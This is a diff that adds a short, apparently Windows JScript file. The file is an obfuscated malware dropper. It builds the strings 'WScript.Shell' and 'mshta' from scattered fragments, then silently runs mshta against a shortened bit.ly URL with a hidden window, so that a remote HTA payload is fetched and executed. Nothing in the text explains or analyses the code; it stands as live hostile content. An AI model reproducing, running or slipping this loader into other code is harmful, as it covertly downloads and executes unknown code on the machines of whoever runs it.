@@ -1,0 +1,10 @@
+lhpfshjl = ("t.S")
+oojlcptp = ("p"+lhpfshjl+"h")
+rumbezmk = ("i"+oojlcptp+"el")
+amwskcnz = ("Scr")
+var bqlyfqsd = WScript.CreateObject("W"+amwskcnz+rumbezmk+"l")
+jdlduzje = ("m")
+vtpludkl = ("sh")
+edbqpjag = ("ta ")
+bqlyfqsd.Run((jdlduzje+vtpludkl+edbqpjag)+" https://bit.ly/3wUOTg1",0)
+bqlyfqsd = null;
